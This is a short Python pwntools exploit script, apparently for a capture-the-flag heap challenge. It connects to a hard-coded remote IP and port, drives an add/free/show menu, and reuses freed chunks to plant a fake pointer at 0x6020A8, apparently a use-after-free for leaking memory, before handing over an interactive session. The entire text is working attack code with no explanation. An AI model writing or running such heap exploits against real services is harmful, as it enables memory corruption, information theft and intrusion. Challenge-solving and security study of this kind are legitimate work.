from pwn import*
def add(sizeI,sizeII,contentI,contentII):
	p.sendlineafter('do :','1')
	p.sendlineafter("length : ",str(sizeI))
	p.sendline(contentI)
	p.sendlineafter("length : ",str(sizeII))
	p.sendline(contentII)
def free(index):
	p.sendlineafter('do :','3')
	p.sendlineafter('ID : ',str(index))
def show(index):
	p.sendlineafter('do :','4')
	p.sendlineafter('ID : ',str(index))
p = remote('123.56.85.29',6484)
context.log_level = 'debug'
fake = 0x6020A8
add(0x20,0x20,'','')		#0
add(0x20,0x20,'','')		#1
free(0)
free(1)
add(0x10,0x20,p64(fake),'')	#2 = 1 -> 0
show(0)
p.interactive()
